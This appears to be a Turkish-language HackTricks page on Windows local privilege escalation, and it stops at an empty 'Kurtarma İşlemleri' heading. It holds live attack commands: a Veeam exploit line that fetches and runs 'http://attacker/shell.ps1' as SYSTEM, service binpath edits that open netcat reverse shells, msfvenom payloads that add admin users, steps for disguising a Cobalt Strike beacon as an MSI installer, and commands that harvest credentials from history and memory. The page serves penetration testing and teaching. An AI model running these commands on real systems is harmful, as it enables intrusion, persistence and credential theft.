# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Windows Access Tokens'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'taki integrity levels'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows'ta sistemin keşfini engelleyebilecek, yürütülebilir dosyaları çalıştırmanızı engelleyebilecek veya aktivitelerinizi tespit edebilecek çeşitli kontroller vardır. Ayrıcalık yükseltme keşfine başlamadan önce bu savunma mekanizmalarının tümünü okumalı ve listelemelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

RAiLaunchAdminProcess aracılığıyla başlatılan UIAccess süreçleri, AppInfo secure-path kontrolleri atlandığında uyarı olmadan High IL'ye ulaşmak için kötüye kullanılabilir. Ayrıntılı UIAccess/Admin Protection bypass iş akışını burada kontrol edin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

Windows sürümünün bilinen bir zafiyeti olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanı 4.700'den fazla güvenlik açığı içerir ve Windows ortamının sunduğu **muazzam saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü)_

**Yerelde sistem bilgisiyle**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits için Github repo'ları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Env variables içinde herhangi bir credential/Juicy bilgi kayıtlı mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi şu adreste öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerine ait ayrıntılar kaydedilir; yürütülen komutlar, komut çağrıları ve betik parçaları dahil edilir. Ancak tam yürütme ayrıntıları ve çıktı sonuçları her zaman yakalanmayabilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümündeki talimatları izleyin; **"Module Logging"** yerine **"Powershell Transcription"** yerine değil, **"Module Logging"** seçeneğini tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs'tan son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betik yürütülmesinin tüm etkinliklerini ve tam içerik kaydını yakalar; böylece her bir kod bloğu çalışırken belgelenmiş olur. Bu süreç, her etkinliğin kapsamlı bir denetim izini korur ve adli analizler ile kötü amaçlı davranışların incelenmesi için değerlidir. Yürütme sırasında tüm etkinlikleri belgeleyerek süreç hakkında ayrıntılı bilgiler sağlar.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için olay günlükleri Windows Olay Görüntüleyicisi'nde şu yol altında bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** ile değil http ile isteniyorsa sistemi ele geçirebilirsiniz.

İlk olarak, ağın SSL olmayan WSUS güncellemesi kullanıp kullanmadığını kontrol etmek için cmd'de aşağıdakini çalıştırın:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdakiler:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Eğer aşağıdakilerden biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` `1` ise.

O zaman, **sömürülebilirdir.** Eğer bahsedilen registry değeri `0` ise, WSUS girdisi yok sayılacaktır.

Bu zafiyetleri istismar etmek için şu araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar, non-SSL WSUS trafiğine 'fake' güncellemeler enjekte eden MiTM weaponized exploit scripts'tir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu hatanın istismar ettiği zafiyet şudur:

> Eğer yerel kullanıcı proxy'imizi değiştirme yetkimiz varsa ve Windows Update Internet Explorer ayarlarında yapılandırılmış proxy'i kullanıyorsa, bu nedenle [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırıp kendi trafiğimizi yakalayabilir ve hedef sistemde yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
>
> Ayrıca, WSUS servisi geçerli kullanıcının ayarlarını kullandığı için kullanıcının sertifika deposunu da kullanır. WSUS ana bilgisayar adı için kendi imzaladığımız bir sertifika üretip bu sertifikayı geçerli kullanıcının sertifika deposuna eklerseniz, hem HTTP hem de HTTPS WSUS trafiğini yakalayabilirsiniz. WSUS, sertifika üzerinde trust-on-first-use türü bir doğrulama uygulamak için HSTS-benzeri bir mekanizma kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir ise ve doğru hostname'e sahipse, servis tarafından kabul edilir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla istismar edebilirsiniz (serbest bırakıldığında).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Birçok kurumsal agent, localhost'ta bir IPC yüzeyi ve ayrıcalıklı bir update kanalı açar. Eğer enrollment bir saldırgan sunucusuna zorlanabilirse ve updater sahte bir root CA'ya veya zayıf signer kontrollerine güvenirse, yerel bir kullanıcı SYSTEM servisi tarafından kurulacak kötü amaçlı bir MSI teslim edebilir. Genel bir teknik (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) için bakın:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` localhost'ta **TCP/9401** üzerinde, saldırgan kontrollü mesajları işleyen ve **NT AUTHORITY\SYSTEM** olarak rastgele komutların çalıştırılmasına izin veren bir servis açar.

- **Recon**: dinleyiciyi ve sürümü doğrulayın, örn., `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: PoC olarak `VeeamHax.exe` gibi bir dosyayı gerekli Veeam DLL'leri ile aynı dizine koyun, sonra yerel soket üzerinden SYSTEM payload'ını tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Hizmet komutu SYSTEM olarak çalıştırılır.

## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** zafiyeti bulunmaktadır. Bu koşullar, **LDAP signing is not enforced,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights'e sahip olmalarını ve kullanıcıların domain içinde bilgisayar oluşturma yeteneğini içerir. Bu **gereksinimlerin** **default settings** ile karşılandığını belirtmek önemlidir.

Bul: **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Saldırının akışı hakkında daha fazla bilgi için şu kaynağa bakın: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Eğer** bu 2 kayıt defteri anahtarı **etkinleştirilmişse** (değer **0x1**), herhangi bir ayrıcalık seviyesindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Power-up içindeki `Write-UserAddMSI` komutunu kullanarak mevcut dizine ayrıcalık yükseltmek için bir Windows MSI ikili dosyası oluşturun. Bu script, kullanıcı/grup eklemesini isteyen ön-derlenmiş bir MSI yükleyicisi yazar (bu nedenle GIU erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Oluşturulan binary'i çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike veya Metasploit kullanarak `C:\privesc\beacon.exe` konumunda bir **new Windows EXE TCP payload** **Generate** edin.
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Projeye bir ad verin, örneğin **AlwaysPrivesc**, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- 4 adımlık işlemde 3. adıma (choose files to include) gelene kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'unu seçin. Ardından **Finish**'e tıklayın.
- Solution Explorer'da **AlwaysPrivesc** projesini seçin ve **Properties** içinde **TargetPlatform**'ı **x86**'ten **x64**'e değiştirin.
- Yüklenecek uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi değiştirebileceğiniz başka özellikler de vardır.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırıldığı anda beacon payload'unun yürütülmesini sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
- Son olarak, **build it**.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötücül `.msi` dosyasının **installation** işlemini arka planda yürütmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Dedektörler

### Denetim Ayarları

Bu ayarlar neyin **kaydedildiğini** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** etki alanına katılmış bilgisayarlarda **local Administrator parolalarının yönetimi** için tasarlanmıştır; her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACLs aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; yetkilendirilmişlerse yerel admin parolalarını görüntüleyebilirler.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Eğer aktifse, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** ile başlayarak, Microsoft, Local Security Authority (LSA) için geliştirilmiş bir koruma sunarak güvenilmeyen süreçlerin belleğini **okuma** veya kod enjekte etme girişimlerini **engelledi**, böylece sistemi daha da güvenli hale getirdi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**, **Windows 10**'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, genellikle kullanıcı için domain credentials oluşturulur.\

[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar & Gruplar

### Kullanıcıları ve Grupları Listeleme

Ait olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bir ayrıcalıklı grubun üyesiyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı grupları ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanabileceğinizi buradan öğrenin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Daha fazla bilgi edinin** bu sayfada bir **token**'ın ne olduğunu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfayı kontrol edin, **ilginç token'lar hakkında bilgi edinin** ve bunları nasıl kötüye kullanacağınızı öğrenin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Giriş yapmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panodaki içeriği al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Her şeyden önce, işlemleri listeleyip **her işlem için komut satırında şifre(ler) olup olmadığını kontrol edin**.\
**Çalışan bir binary'i overwrite edip edemeyeceğinizi** veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismar etmek için binary klasörünün yazma izinlerine sahip olup olmadığınızı kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman olası [**electron/cef/chromium debuggers** çalışıyor mu kontrol edin; bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Process binaries klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Çalışan bir sürecin memory dump'ını sysinternals'tan **procdump** ile oluşturabilirsiniz. FTP gibi servisler bellek içinde **credentials in clear text in memory** tutar; belleği dump etmeyi ve credentials'ları okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcıya CMD başlatma veya dizinlerde gezme imkanı verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" aratın, "Click to open Command Prompt" öğesine tıklayın

## Hizmetler

Service Triggers, belirli koşullar oluştuğunda (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, vb.) Windows'un bir servisi başlatmasına izin verir. SERVICE_START haklarına sahip olmasanız bile, tetiklerini çalıştırarak ayrıcalıklı servisleri sıklıkla başlatabilirsiniz. Burada listeleme ve etkinleştirme tekniklerine bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servislerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servisin gerekli ayrıcalık seviyesini kontrol etmek için _Sysinternals_'ten **accesschk** ikili dosyasına sahip olmanız önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
“Authenticated Users”'in herhangi bir servisi değiştirebilme yetkisi olup olmadığını kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Bunu etkinleştirmek için şu komutu kullanabilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu dikkate alın (XP SP1 için)**

**Başka bir çözüm** bu sorunu çözmek için aşağıdakini çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Hizmet binary yolunu değiştir**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu durumda, servisin çalıştırılabilir binary dosyasının değiştirilmesi mümkündür. Değiştirmek ve çalıştırmak için **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis ikili dosyasının yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar; bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini sağlar.
- **GENERIC_ALL**: Ayrıca servis yapılandırmalarını değiştirme yeteneğini sağlar.

Bu zafiyetin tespiti ve sömürülmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis ikili dosyalarının zayıf izinleri

**Bir servis tarafından çalıştırılan ikili dosyayı değiştirip değiştiremeyeceğinizi kontrol edin** veya ikili dosyanın bulunduğu klasörde **yazma iznine** sahip olup olmadığınızı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Her servisin çalıştırdığı tüm ikili dosyaları **wmic** kullanarak (not in system32) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol edebilirsiniz**:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahipse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory izinleri

Bir registry üzerinde bu izine sahipseniz, **bu kayıttan alt kayıtlar oluşturabilirsiniz**. Windows servisleri durumunda bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable dosyasının yolu tırnak içinde değilse, Windows boşluktan önce gelen her son parçayı çalıştırmayı dener.

Örneğin, yol _C:\Program Files\Some Folder\Service.exe_ için Windows şu yolları çalıştırmaya çalışacaktır:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içermeyen tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Tespit edebilir ve sömürebilirsiniz** bu güvenlik açığını metasploit ile: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma İşlemleri

